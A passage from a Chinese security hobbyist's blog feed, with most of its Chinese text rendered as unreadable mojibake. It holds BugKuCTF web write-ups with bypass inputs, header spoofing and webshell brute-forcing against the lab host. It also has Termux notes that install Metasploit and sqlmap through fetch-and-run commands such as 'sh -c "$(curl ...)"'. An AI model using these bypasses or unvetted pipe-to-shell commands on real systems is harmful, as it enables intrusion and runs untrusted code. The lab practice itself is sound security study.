print(&quot;NASæœåŠ¡å™¨IPåœ°å€ä¸º &gt; {}:{}&quot;.format(match,ip))            pass    except:        passfor i in range(0,256):    t = threading.Thread(target=searchNAS,args=(i, ))    t.start()</code></pre><p>å±€åŸŸç½‘å†…æ˜¯DHCPä¼šæ¯å¤©ä¼šæ›´æ¢IPï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—å°±åšäº†ä¸€ä¸ªæœ¬åœ°NASçš„ipæœç´¢å™¨ã€‚æ–¹ä¾¿è‡ªå·±æ‰¾åˆ°å­˜å‚¨æœåŠ¡å™¨ğŸ˜—</p><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€BugKuCTFã€‘é¶åœºéƒ¨åˆ†writeup</title>
      <link href="/2019/05/20/BugKuCTF/"/>
      <url>/2019/05/20/BugKuCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»">0x00 ä»‹ç»</h1><p>å¼€å§‹åšä¸€äº›CTFé¢˜ç›®äº†ã€‚æ‰“ç®—åœ¨é«˜èŒæ¯”èµ›ç©ç©CTFxD</p><a id="more"></a><p>åœ°å€:<a href="https://ctf.bugku.com/challenges" target="_blank" rel="noopener">https://ctf.bugku.com/challenges</a></p><ul><li><h3 id="WEBç¯‡"><strong>WEBç¯‡</strong></h3><h4 id="web2">[<code>web2</code>]</h4><p>è¿™ç§ç±»å‹ç›´æ¥çœ‹æºç  F12æˆ–è€…Ctrl+U</p><p><img src="web2.PNG" alt></p></li></ul><h4 id="è®¡ç®—å™¨">[<code>è®¡ç®—å™¨</code>]------------------------------------------------------</h4><p>è¯•ç€ç®—å‡ºæ¥,ç„¶åå‘ç°åªèƒ½è¾“å…¥ä¸€ä½æ•°ï¼Œå°±èƒ½çŒœæµ‹åˆ°ä»–é™åˆ¶äº†é•¿åº¦ï¼Œæ¥ç€æˆ‘ä»¬è·‘åˆ°F12é‡Œé¢å»ä¿®æ”¹å³å¯</p><p><img src="%E8%AE%A1%E7%AE%97%E5%99%A81.png" alt="è®¡ç®—å™¨1"></p><p><img src="%E8%AE%A1%E7%AE%97%E5%99%A82.PNG" alt="è®¡ç®—å™¨2"></p><h4 id="webåŸºç¡€-GET">[<code>webåŸºç¡€$_GET</code>]------------------------------------------------------</h4><p>ä¸è§£é‡Šï¼Œç›´æ¥çœ‹ä»£ç </p><p><img src="$GET.PNG" alt="$GET"></p><p><img src="$get1.PNG" alt="$get1"></p><h4 id="webåŸºç¡€-POST">[<code>webåŸºç¡€$_POST</code>]------------------------------------------------------</h4><p>ä¹Ÿä¸è§£é‡Šï¼Œç›´æ¥çœ‹ä»£ç ï¼Œéœ€è¦ç”¨åˆ°æŠ“åŒ…è½¯ä»¶</p><p><img src="$POST.PNG" alt="$POST"></p><h4 id="çŸ›ç›¾">[<code>çŸ›ç›¾</code>]------------------------------------------------------</h4><p>å…ˆçœ‹ä»£ç </p><p><img src="%E7%9F%9B%E7%9B%BE.PNG" alt="çŸ›ç›¾"></p><p>é—®é¢˜å‡ºç°åœ¨ <code>is_numeric</code> è¿™ä¸ªå‡½æ•°,<code>is_numeric</code> æ˜¯åˆ¤æ–­ ä¼ å…¥çš„å­—ç¬¦ä¸²æ˜¯å¦ä¸ºæ•°å­—ã€‚å¦‚æœæ˜¯åˆ™ä¸è¾“å‡º,ä¸æ˜¯åˆ™è¾“å‡º<code>$num</code>ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ç»•è¿‡è¿™ä¸ªå‡½æ•°ã€‚</p><p>ä»–åˆ¤æ–­çš„æ˜¯æ•°å­—é‚£ä¹ˆæˆ‘ä»¬ç»™ä»–åŠ ç‚¹å­—ç¬¦ä¸² <code>?num=1a</code>ï¼Œåˆ™ç»•è¿‡äº†ç¬¬ä¸€ä¸ª<code>if</code>åˆ¤æ–­ï¼Œå¹¶è·³åˆ°äº†ç¬¬äºŒä¸ª<code>if</code>åˆ¤æ–­ã€‚</p><p>ç„¶åä»–ç°åœ¨ç›´æ¥æ˜¾ç¤ºå‡ºäº†flag.</p><p><img src="%E7%9F%9B%E7%9B%BE2.PNG" alt="çŸ›ç›¾2"></p><h4 id="web3">[<code>web3</code>]---------------------------------------------------</h4><p>ä»–ä¼šä¸€ç›´å¼¹çª—å‡ºæ¥ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„Chromeä¸ä¼šè·³å‡ºæ¥ã€‚</p><p><img src="web3.png" alt="web3"></p><p>æ¥ç€æˆ‘ä»¬ç›´æ¥çœ‹æºç F12  æˆ–è€… Ctrl+Uï¼Œå‘ç°æœ€ä¸‹é¢æœ‰ä¸€ä¸ªè¢«æ³¨é‡Šçš„htmlç¼–ç </p><p><img src="web3-1.PNG" alt="web3-1"></p><p>æˆ‘çš„æ–¹æ³•æ˜¯ï¼Œç¼–å†™åˆ°æ–‡æœ¬ï¼Œæ¢htmlæ ¼å¼æ‰“å¼€ã€‚</p><p><img src="web3-2.PNG" alt="web3-2"></p><p>è§£ç å°±å‡ºæ¥äº†.</p><h4 id="åŸŸåè§£æ">[<code>åŸŸåè§£æ</code>]-------------------------------------------------</h4><p><img src="%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90.PNG" alt="åŸŸåè§£æ"></p><p>ä¿®æ”¹hostsè®¿é—® flag.baidu.comå³å¯.</p><ul><li><p>hostsä½ç½®</p><p>windowsï¼š</p><p>C:\Windows\System32\drivers\etc</p><p>linux:</p><p>/etc/hosts</p></li></ul><h4 id="ä½ å¿…é¡»è®©ä»–åœä¸‹æ¥">[<code>ä½ å¿…é¡»è®©ä»–åœä¸‹æ¥</code>]--------------------------------------------</h4><p>æ‰“å¼€ç½‘å€å‘ç°ä»–ä¸€ç›´åˆ·æ–°ã€‚äºŒè¯ä¸è¯´ç›´æ¥ä¸ŠBurpsuiteæŠ“åŒ…ï¼Œå¹¶æ”¾åˆ°Repeater(Ctrl+R)ã€‚</p><p>å¤šGoå‡ éå°±èƒ½çœ‹åˆ°flagäº†</p><p><img src="%E5%81%9C%E4%B8%8B%E6%9D%A5.PNG" alt="åœä¸‹æ¥"></p><h4 id="æœ¬åœ°æ–‡ä»¶åŒ…å«">[<code>æœ¬åœ°æ–‡ä»¶åŒ…å«</code>]--------------------------------------------------</h4><p><strong>ç½‘ç«™è¿›ä¸å»ã€‚æ”¾å¼ƒ.</strong></p><h4 id="å˜é‡1">[<code>å˜é‡1</code>]------------------------------------------------------</h4><p>å…ˆçœ‹å®¡è®¡ä»£ç ï¼Œå‘ç°æœ€ä¸‹é¢æœ‰ä¸¤ä¸ª$$args</p><p><img src="%E5%8F%98%E9%87%8F1.PNG" alt="å˜é‡1"></p><p>$$   å®¹æ˜“å¼•å‘å˜é‡è¦†ç›–</p><p>æ€è€ƒã€‚æˆ‘ä»¬ç›´æ¥è®©ä»–å…¨éƒ¨å€¼æ˜¾ç¤ºå‡ºæ¥ã€‚ä½¿ç”¨å…¨å±€å˜é‡<code>$GLOBALS</code></p><p>æˆ‘ä»¬ç›´æ¥ç»™ä»– å…¨å±€å˜é‡<code>$GLOBALS</code>ä¼ å‚è¿›å»,args=GLOBALS</p><p>tips:å…³äºå…¨å±€å˜é‡https://www.runoob.com/php/php-superglobals.html</p><p><img src="%E5%8F%98%E9%87%8F1-2.PNG" alt="å˜é‡1-2"></p><h4 id="web5">[<code>web5</code>]----------------------------------------------------</h4><p>è¾“å…¥å­—ç¬¦ä¸²,å•¥ä¸œè¥¿éƒ½æ²¡æœ‰</p><p><img src="web5.PNG" alt="web5"></p><p>ç›´æ¥çœ‹çœ‹æºç F12 æˆ–è€… Ctrl+U</p><p><img src="web5-1.PNG" alt="web5-1"></p><p>å‘ç°è¿™ä¸€ä¸²çœ‹ä¸æ‡‚çš„ç¼–ç ã€‚è¿™ç§ç¼–ç æ˜¯JSFUCKå±äºä¸€ç›´ åŠ å¯†æ–¹å¼</p><p>tips:åŸç†<a href="https://blog.csdn.net/qq_36539075/article/details/79946099" target="_blank" rel="noopener">https://blog.csdn.net/qq_36539075/article/details/79946099</a></p><p>ç›´æ¥F12åœ¨Consoleé‡Œç²˜è´´</p><p><img src="web5-2.PNG" alt="web5-2"></p><h4 id="å¤´ç­‰èˆ±">[<code>å¤´ç­‰èˆ±</code>]------------------------------------------------------</h4><p>ä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚</p><p><img src="%E5%A4%B4%E7%AD%89%E8%88%B1.PNG" alt="å¤´ç­‰èˆ±"></p><p>åœ¨çœ‹ä¸‹å¤´ç­‰èˆ±ã€‚å°±èƒ½çŒœæµ‹åˆ°ä»–flagè‚¯å®šåœ¨ è¯·æ±‚å¤´é‚£è¾¹ï¼Œäºæ˜¯ç›´æ¥ä¸ŠæŠ“åŒ…è½¯ä»¶ï¼Œå¹¶GOä¸€éçœ‹çœ‹</p><p><img src="%E5%A4%B4%E7%AD%89%E8%88%B11.PNG" alt="å¤´ç­‰èˆ±1"></p><p>æ‹¿åˆ°flagï¼</p><h4 id="ç½‘ç«™è¢«é»‘">[<code>ç½‘ç«™è¢«é»‘</code>]------------------------------------------------------</h4><p>æ‰“å¼€ç½‘ç«™ã€‚å¥½ç‚«å•Šã€‚è¿˜ä¼šè·Ÿç€é¼ æ ‡åŠ¨ï¼Œå¥½ï¼å·ä»£ç ä¸‹æ¥äº†</p><p><img src="webshell1.PNG" alt="webshell1"></p><p>å•¥ä¹Ÿæ²¡æç¤ºã€‚ç›´æ¥ä¸Šå¾¡å‰‘æ‰«ææ‰¾åˆ°ä¸€ä¸ªã€‚<strong>shellçš„è·¯å¾„</strong> 123.206.87.240:8002/webshell/shell.php</p><p><img src="webshell2.PNG" alt="webshell2"></p><p>äºŒè¯ä¸è¯´ç›´æ¥ä¸Šçˆ†ç ´Burp Suite</p><p><img src="webshell3.PNG" alt="webshell3"></p><p>è¾“å…¥ä¸Šå»</p><p><img src="20180813135625263.png" alt="20180813135625263"></p><p>GETåˆ°flag</p><h4 id="ç®¡ç†å‘˜ç³»ç»Ÿ"><strong>[<code>ç®¡ç†å‘˜ç³»ç»Ÿ</code>]------------------------------------------------------</strong></h4><p>æ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªç™»å…¥ç•Œé¢ã€‚å°è¯•ä½¿ç”¨SQLä¸‡èƒ½å¯†ç ç™»å…¥</p><p><img src="%E6%8D%95%E8%8E%B7.PNG" alt="æ•è·"></p><p>å¤±è´¥äº†ã€‚IPè¢«ç¦æ­¢è®¿é—®ã€‚</p><p><img src="%E6%8D%95%E8%8E%B71.PNG" alt="æ•è·1"></p><p>äºæ˜¯æ‰“å¼€æŠ“åŒ…è½¯ä»¶åœ¨è¯·æ±‚å¤´ä¸Šæ·»åŠ ä¸Š**<code>X-Forwarded-For 127.0.0.1</code>**</p><p>å†è¯•è¯•ä¸‡èƒ½å¯†ç </p><p><img src="%E6%8D%95%E8%8E%B72.PNG" alt="æ•è·2"></p><p>å¯†ç é”™è¯¯ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹æºç F12</p><p><img src="%E6%8D%95%E8%8E%B73.PNG" alt="æ•è·3"></p><p>çœ‹åˆ°æºç ä¸­æœ‰ä¸€ä¸ªè¢«æ³¨é‡Šçš„base64çš„ç¼–ç ã€‚äºæ˜¯è§£å¯†å‡ºæ¥çœ‹æ˜¯<strong>test123</strong>é‚£ä¹ˆç”¨æˆ·åæ˜¯**<code>admin</code><strong>å¯†ç æ˜¯</strong><code>test123</code>**</p><p><strong>tips:ä¸å®šæ—¶æ›´æ–°ã€‚æ¯æ›´æ–°åä¸ªé¢˜ç›®</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF-Web-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Termuxå®‰è£…ç¬”è®°</title>
      <link href="/2019/02/02/Termux%E5%AE%89%E8%A3%85/"/>
      <url>/2019/02/02/Termux%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»">0x00 ä»‹ç»</h1><p>ä¸ºäº†æ–¹ä¾¿,éšæ—¶éšåœ°èƒ½åšæ¸—é€æµ‹è¯•åˆå®‰è£…ä¸äº†NetHuterçš„æ—¶å€™åšå‡ºæ¥çš„æ•´ç†ã€‚ä¹Ÿä¸ºäº†æ–¹ä¾¿æˆ‘è‡ªå·±ä»¥ååˆ·ç³»ç»Ÿèƒ½åœ¨å®‰è£…å›æ¥ï¼Œå†™å†™ç¬”è®°</p><a id="more"></a><ul><li><p><strong>ç§‘å­¦ä¸Šç½‘</strong></p><ol><li><p>åœ¨Githubä¸Šæœç´¢ShadowsocksR</p><p>(<a href="https://github.com/shadowsocksr-backup/shadowsocksr-android/releases" target="_blank" rel="noopener">https://github.com/shadowsocksr-backup/shadowsocksr-android/releases</a>)</p></li><li><p>èµ›é£</p></li></ol></li><li><p><strong>Termuxä¸‹è½½åœ°å€</strong></p><ol><li>Googleå•†åŸ(è¦å€ŸåŠ©ç§‘å­¦ä¸Šç½‘)</li><li>é…·å®‰</li></ol></li><li><p><strong>Termuxæ›´æ”¹æº</strong></p><ul><li><p>è‡ªåŠ¨æ›´æ¢æŒ‡ä»¤</p><pre><code class="language-shell">sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux stable main@' $PREFIX/etc/apt/sources.list</code></pre></li><li><p>æ‰‹åŠ¨ä¿®æ”¹</p><p>â€‹ç¼–è¾‘ <code>$PREFIX/etc/apt/sources.list</code> ä¿®æ”¹ä¸ºå¦‚ä¸‹å†…å®¹</p><pre><code class="language-shell"># The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main</code></pre></li></ul><p>å¹¶æ›´æ–°pkg up / apt update</p><p>ä¸¤ç§æ–¹æ³•å®‰è£…metasploit</p></li><li><p><strong>ä¸¤ç§æ–¹æ³•å®‰è£…metasploit</strong></p><ul><li>ç¬¬ä¸€ç§</li></ul><pre><code class="language-bash">pkg install metasploit</code></pre><p><strong>ä¸€è·¯é»˜è®¤å®‰è£…</strong></p><ul><li><p>ç¬¬äºŒç§</p><pre><code class="language-bash">apt install wgetwget https://Auxilus.github.io/metasploit.shsh metasploit.shpkg install metasploit</code></pre></li></ul><pre><code>    </code></pre></li><li><p><strong>Termuxå®‰è£…ä¸€äº›Pythonå¿…è¦çš„åº“</strong></p><pre><code class="language-bash">pkg install python python-dev python2 python2-dev</code></pre></li><li><p><strong>Termuxå®‰è£…ä¸€äº›å¸¸ç”¨çš„è¾…åŠ©å·¥å…·</strong></p><pre><code class="language-bash">pkg install git curl</code></pre></li><li><p><strong>ç¾åŒ–Termux</strong></p><ul><li><p>oh-my-zshçš„å®‰è£…</p><pre><code class="language-bash">sh -c &quot;$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)&quot;</code></pre><p>ä¸€æ­¥åˆ°ä½ï¼Œåé¢è‡ªå·±é€‰æ‹©ä¸»é¢˜å’Œé¢œè‰²</p></li></ul></li><li><p><strong>Termuxå®‰è£…nmap</strong></p><pre><code class="language-bash">pkg install nmap</code></pre></li><li><p><strong>Termuxå®‰è£…SQLMap</strong></p><pre><code class="language-bash">apt install python2 gitgit clone https://github.com/sqlmapproject/sqlmap</code></pre></li></ul><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è½¬è½½ã€‘é»‘è‹¹æœå®‰è£…ç¬”è®°</title>
      <link href="/2018/12/15/BlackApple/"/>
      <url>/2018/12/15/BlackApple/</url>
      
        <content type="html"><![CDATA[<h2>ä¸Šä¸ªæ˜ŸæœŸè£…çš„åŒç³»ç»Ÿ,win10 & MACOS,è¿˜æŠŠä¹‹å‰çš„win10æå´©äº†ã€‚å®³çš„æˆ‘åªèƒ½é‡è£…win10</h2><a id="more"></a><pre><code>æˆ‘è¦æ€»ç»“çš„è½¬è½½çš„ç®€ä¹¦éƒ½ã€‚ã€‚å¸®æˆ‘ä¸€èµ·æ€»ç»“äº†ï¼Œæ‰€ä»¥æˆ‘å°±æ‡’çš„å†™äº† å˜»å˜»        è¦ç‚¹:        1ã€ä¸¤ç³»ç»Ÿå…±å­˜åˆ™ç£ç›˜å¿…é¡»æ˜¯GPTæ ¼å¼        2ã€å®‰è£…macè¦ç”¨é€‚åˆæœºå‹çš„EFIæ–‡ä»¶å’Œç›¸åº”çš„å®‰è£…é…ç½®ï¼Œç‰¹åˆ«æ˜¯æ˜¾å¡é©±åŠ¨&lt;br&gt;        3ã€å®‰è£…å®Œä»¥åè¦æŠŠmacå’Œwinå®Œæ•´çš„EFIæ–‡ä»¶åˆå¹¶åˆ°ä¸€èµ·å¹¶ä¸”æ”¾å…¥ç”µè„‘å®‰è£…æ—¶è‡ªåŠ¨åˆ†å¥½çš„EFIåˆ†åŒºå†…&lt;br&gt;        4 ã€ç”¨cloveræŒ‚è½½å¥½æ‰€æœ‰çš„ç”µè„‘å†…EFIå¼•å¯¼æ–‡ä»¶ï¼ˆå³mac å’Œ winçš„ï¼‰        ç®€ç•¥æ­¥éª¤:        è¿œæ™¯ï¼šä»GPT(GUID) åˆ†åŒºå¼€å§‹,EasyUEFI åŒç³»ç»Ÿå®‰è£…è¯¦è§£(install.wim + mac10.12.5)è¿™æ˜¯win7+mac10.12çš„å¸–å­ï¼Œæ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥çœ‹çœ‹ï¼Œäº†è§£EFIåˆ†åŒºã€‚win10+mac10.12 ç›´æ¥çœ‹12æ¥¼çš„å›å¤å°±å¯ä»¥äº†&lt;br&gt;        åˆ†åŒºï¼šPEä¸‹åˆ†ä¸€ä¸ªESP ï¼ŒäºŒä¸ªNT&lt;br&gt;        å®‰è£…MACï¼šuç›˜å®‰è£…        å®‰è£…win10ï¼šPEä¸‹å®‰è£…WINçš„WIMé•œåƒï¼Œåœ¨è½¯ä»¶é‡Œé€‰å¯¹ç³»ç»Ÿåˆ†åŒºï¼Œå¯åŠ¨åˆ†åŒºï¼Œå¼•å¯¼ç±»å‹        EFIå¼•å¯¼ï¼šè£…å¥½WINåï¼ŒCOPY CLOVERè¿›ESPï¼Œå°±å®Œäº‹äº†        æŠŠMac efié‡Œé¢CLOVERæ–‡ä»¶å¤¹æ”¾åˆ°espåˆ†åŒºçš„efiæ–‡ä»¶å¤¹é‡Œï¼Œç„¶åç”¨easyuefiæ·»åŠ EFI/CLOVER/CLOVERX64.efiå¼•å¯¼        åœ¨æ­¤ä¹‹å‰éœ€è¦çš„å‡†å¤‡ï¼š        ç¡¬ä»¶æ–¹é¢ï¼š        ä¸€å°i7-7700k + Gigabyte Z270X-Gaming5 å°å¼æœº        æœ€å¥½æœ‰ä¸€å°å¯ç”¨çš„mac        2ä¸ªä»¥ä¸Šç©ºçš„8Gæˆ–ä»¥ä¸Šçš„Uç›˜        è½¯ä»¶æ–¹é¢ï¼š        å‡†å¤‡å¥½mac 10.11.3é•œè±¡        å‡†å¤‡å¥½åœ¨winä¸Šåˆ¶ä½œmacé•œè±¡çš„å·¥å…·ï¼štransmac(è‡ªè¡Œç™¾åº¦ï¼‰æˆ–è€…macä¸Šåˆ¶ä½œmacé•œåƒçš„å·¥å…·ï¼šUnibeast        å‡†å¤‡å¥½åœ¨macä¸ŠæŒ‚è½½EFIåˆ†åŒºçš„å·¥å…·ï¼šClover Configurator       BIOSè®¾ç½®ï¼š        å¯åŠ¨æ–¹å¼ï¼šUEFI        ç¡¬ç›˜æ¨¡å¼ï¼šACHI        å®¶ä¼™äº‹å‡†å¤‡å¾—å·®ä¸å¤šäº†æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹äº†ã€‚        ä¸€ã€é¦–å…ˆåˆ¶ä½œmacç³»ç»Ÿå®‰è£…ç›˜        1 winç³»ç»Ÿï¼šåœ¨winé‡Œä¸‹è½½å¥½mac 10.12ç³»ç»Ÿå¹¶å®‰è£…å¥½transmac        2 Mac ç³»ç»Ÿï¼šä¸‹è½½macOS Sierra 10.12 å¹¶å®‰è£…Unibeastï¼Œåˆ¶ä½œmacå®‰è£…ç›˜        äºŒã€åˆ¶ä½œwin10ç³»ç»Ÿå®‰è£…ç›˜        ä¸‰ã€å®‰è£…macï¼Œæˆ‘ä»¬è¦å®ç°macå’Œwin10åŒæ—¶å­˜åœ¨ï¼Œå¹¶è¦åŒå¼•å¯¼ï¼Œæ‰€ä»¥å¿…é¡»è¦uefiå¼•å¯¼æ–¹å¼ï¼Œè€Œwin10è¦uefiå¼•å¯¼å°±å¿…é¡»è£…åœ¨GPTæ ¼å¼çš„ç£ç›˜ä¸Šï¼Œæ‰€ä»¥ï¼Œé¦–å…ˆï¼Œå¿…é¡»å°†ç£ç›˜è®¾ç½®ä¸ºGPTæ ¼å¼ï¼Œæ‰€ä»¥å…ˆç”¨win10çš„ç³»ç»Ÿç›˜æ’å…¥ç”µè„‘ï¼Œå¼€æœºï¼Œè¿›å…¥å®‰è£…ç•Œé¢ï¼Œåœ¨é€‰æ‹©è£…åœ¨å“ªä¸ªç›˜çš„æ—¶å€™ç‚¹å‡»shift F10ï¼Œç„¶ååœ¨dosé‡Œæ“ä½œï¼Œå…·ä½“æ“ä½œä¸å†æ­¤è¯´æ˜       è®¾ç½®ç£ç›˜æ ¼å¼ä¸ºGPTä»¥åï¼Œé€€å‡ºwindowså®‰è£…ï¼Œæˆ‘ä»¬å…ˆè¿˜æ˜¯å®‰è£…mac çš„ï¼ŒæŠŠæˆ‘ä»¬åšå¥½çš„macç³»ç»Ÿç›˜æ’å…¥ç”µè„‘ï¼Œå¼€æœºï¼ŒæŒ‰F7ï¼Œç”¨Uç›˜å¼•å¯¼ï¼Œé€‰æ‹©install OS X EI Capitan,æŒ‰ç…§æç¤ºä¸€æ­¥ä¸€æ­¥å®‰è£…å®Œæˆå³å¯ï¼Œå¤§æ¦‚20-25åˆ†é’Ÿï¼Œå–å†³äºä½ çš„Uç›˜é€Ÿåº¦ã€‚è¿™é‡Œæœ‰ä¸ªåˆ†åŒºçš„é—®é¢˜ï¼Œä½ æƒ³ç»™macå¤šå°‘ç©ºé—´ï¼Œå°±å¤šå°‘ï¼Œå…¶å®ƒçš„ä¸ç”¨åˆ›å»ºåˆ†åŒºï¼Œç­‰windowsåˆ›å»ºå³å¯ï¼Œæˆ‘128å›ºæ€ç»™mac40Gã€‚ä¹‹åmacå®‰è£…å®Œæˆ        å››ã€å®‰è£…å®Œæˆåï¼Œå…³æœºï¼Œæ’å…¥ win7ç³»ç»Ÿç›˜ï¼ŒåŒæ ·UEFIå®‰è£…ç”¨Uç›˜å¼•å¯¼ï¼Œå®‰è£…åœ¨ssdå‰©ä¸‹çš„ç©ºé—´é‡Œï¼Œæ²¡æœ‰ä»€ä¹ˆå¥½è¯´çš„ã€‚&lt;br&gt;è¿™ä¸ªæ—¶å€™windowså’Œmacéƒ½å®‰è£…å¥½äº†ï¼Œä½†æ˜¯è¿™ä¸ªæ—¶å€™ä½ æ‹¨æ‰Uç›˜å¼€æœºä¼šå‘ç°ç›´æ¥è¿›å…¥äº†win10ç³»ç»Ÿï¼Œè¯´å¥½çš„é€‰æ‹©å‘¢ï¼Ÿ ä¸æ€¥ï¼Œæˆ‘ä»¬macçš„efiä¹Ÿè¿˜æ²¡æœ‰æ›¿æ¢å‘¢ã€‚       äº”ã€å¤„ç†ç”µè„‘EFIåˆ†åŒºï¼šé¦–å…ˆï¼Œç”¨Uç›˜å¼•å¯¼ï¼Œè¿›å…¥mac,åŒæ—¶ç”¨å·¥å…·æŒ‚è½½ç”µè„‘å’Œç³»ç»Ÿç›˜ä¸¤ä¸ªEFIåˆ†åŒºï¼Œå¹¶æŠŠEFIæ–‡ä»¶å¤¹åˆ é™¤ï¼ŒæŠŠæˆ‘ä»¬ä¸‹è½½å¥½çš„EFIæ–‡ä»¶å¤¹åˆ†åˆ«æ”¾è¿›å»ï¼Œä¸åšä½œä½•å¤„ç†ï¼Œå°±æ˜¯è¯´ç°åœ¨ç”µè„‘é‡Œæœ‰macéœ€è¦çš„é…ç½®ã€é©±åŠ¨ç­‰éƒ½æœ‰äº†ï¼Œå…³æœºï¼Œæ‹¨æ‰Uç›˜ï¼Œå¼€æœºï¼Œè¿›å…¥win10ç³»ç»Ÿï¼Œåœ¨win10ä¸‹åŒæ ·æŒ‚è½½ç”µè„‘EFIåˆ†åŒºï¼Œæ€ä¹ˆæŒ‚è½½å‘¢ï¼Ÿï¼Œ æ’å…¥win10çš„ç³»ç»Ÿç›˜ï¼ŒæŠŠé‡Œè¾¹çš„efiæ–‡ä»¶å¤¹é‡Œè¾¹çš„å†…å®¹æ›¿æ¢è¿›å»ï¼ˆæ³¨æ„æ˜¯å†…å®¹æ›¿æ¢ï¼Œä¸æ˜¯æŠŠåŸæ¥çš„efiåˆ é™¤ï¼ŒæŠŠè¿™ä¸ªæ”¾è¿›å»ï¼Œå› ä¸ºåŸæ¥çš„efié‡Œè¾¹å·²ç»æœ‰macçš„å¯åŠ¨æ–‡ä»¶äº†ï¼‰        æ›¿æ¢å®Œäº†åï¼Œå…³æœºï¼Œæ‹¨æ‰win10ç³»ç»Ÿç›˜ï¼Œæ’å…¥macç³»ç»Ÿç›˜ï¼Œå¼€æœºï¼ŒæŒ‰F7,ç”¨Uç›˜å¼•å¯¼ï¼Œåœ¨cloverç•Œé¢å…ˆæ‹© boot option ,å…ˆæ‹©ç¬¬ä¸€ä¸ªæŒ‚è½½æ‰€æœ‰å¼•å¯¼ï¼Œå¿˜äº†å…·ä½“æ˜¯ä»€ä¹ˆäº†ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€ï¼Œå¦‚æœä½ å‘ç°å³ä¸‹è§’çš„cloverç‰ˆæœ¬å·å˜äº†ï¼Œå°±æˆåŠŸäº†ï¼Œè¿™ä¸ªæ—¶å€™restartï¼Œæ‹¨æ‰Uç›˜ï¼Œå¼€æœºåº”è¯¥è‡ªåŠ¨åˆ°cloveré€‰æ‹©ç•Œé¢ï¼Œå¯ä»¥é€‰æ‹©ä½œæ„ç³»ç»Ÿäº†ã€‚æ­¤æ—¶macå’Œwin10åŒå¼•å¯¼åŸºæœ¬å®Œæˆã€‚        æ¥ä¸‹æ¥å°±æ˜¯å®‰è£…å„ç§é©±åŠ¨å’Œå®Œå–„äº†</code></pre><blockquote><p><strong>å‚è€ƒ</strong>:<a href="https://www.jianshu.com/p/5db38511cc73" target="_blank" rel="noopener">https://www.jianshu.com/p/5db38511cc73</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€å‘¨8ä¸ªç²¾é€‰æ–‡ç« :ç¬¬ä¸€ç« </title>
      <link href="/2018/12/05/Daily01/"/>
      <url>/2018/12/05/Daily01/</url>
      
        <content type="html"><![CDATA[<blockquote><a id="more"></a><p>ä»å¤–ç½‘åˆ°å†…ç½‘çš„æ¸—é€å§¿åŠ¿åˆ†äº« : <a href="https://xz.aliyun.com/t/5330" target="_blank" rel="noopener">https://xz.aliyun.com/t/5330</a></p><p>åŸºäºEVE-NGå¹³å°ä¸Šæ„å»ºä¼ä¸šå†…ç½‘æ”»é˜²ç¯å¢ƒ : <a href="https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA</a></p><p>PHP å‡½æ•°æ¼æ´æ€»ç»“ : <a href="https://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/60968595</a></p><p>CTF Training ç»å…¸èµ›é¢˜å¤ç°ç¯å¢ƒ: <a href="https://github.com/CTFTraining/CTFTraining" target="_blank" rel="noopener">https://github.com/CTFTraining/CTFTraining</a></p><p>RemTeamæ”»å‡»æŠ€å·§å’Œå®‰å…¨é˜²å¾¡ : <a href="https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/)" target="_blank" rel="noopener">https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/)</a></p><p>ç›˜ç‚¹é‚£äº›æ¸—é€æµ‹è¯•ä¸­çš„å¥‡æ·«æŠ€å·§: <a href="https://paper.seebug.org/92/" target="_blank" rel="noopener">https://paper.seebug.org/92/</a></p><p>APT34å·¥å…· :<a href="https://github.com/p3pperp0tts/APT34" target="_blank" rel="noopener">https://github.com/p3pperp0tts/APT34</a></p><p>CTFçº¿ä¸‹æ”»é˜²æŒ‡å— : <a href="http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/" target="_blank" rel="noopener">http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/</a></p></blockquote><p><em><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€PythonScriptã€‘:WebShell</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
